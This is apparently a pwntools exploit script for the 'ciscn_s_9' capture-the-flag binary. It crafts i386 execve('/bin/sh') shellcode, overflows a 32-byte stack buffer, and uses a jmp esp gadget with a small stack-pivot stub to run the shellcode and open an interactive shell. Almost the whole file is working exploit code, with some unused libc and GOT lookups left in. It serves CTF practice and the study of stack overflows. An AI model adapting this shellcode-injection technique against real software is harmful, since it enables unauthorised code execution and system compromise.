from pwn import *
from LibcSearcher import *

p=process('./ciscn_s_9')
# p=remote('node4.buuoj.cn',28270)
elf=ELF('./ciscn_s_9')
libc=ELF('/home/cc/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
p.recvuntil(b'>\n')
context.arch='i386'
# context.log_level='debug'
newstack=0x8047000
print("newstack:",hex(newstack))
# gdb.attach(p)
# pause()
hint_addr=0x08048551
pwn_addr=0x080484BB
pop_ebp=0x08048557
pop_ebx=0x08048359
pop_edi_ebp=0x080485da
jmp_esp=0x08048554
leave_ret=0x08048428
add_esp=0x080485F3
jmp_esp=0x08048554
__libc_start_main_got=0x804a018
fflush_got=elf.got['fflush']
puts_got=elf.got['puts']
fgets_got=elf.got['fgets']
puts_plt=elf.plt['puts']
_libc_start_main_got=elf.got['__libc_start_main']

payload=asm("xor ecx,ecx;xor edx,edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80")
payload+=(32-len(payload))*b'a'
payload+=flat([newstack,jmp_esp])
payload+=asm('''
             sub esp,0x28
             jmp esp
             ''')
# gdb.attach(p,'b *0x0804854F')
# gdb.attach(p)
pause()
p.sendline(payload)
p.interactive()
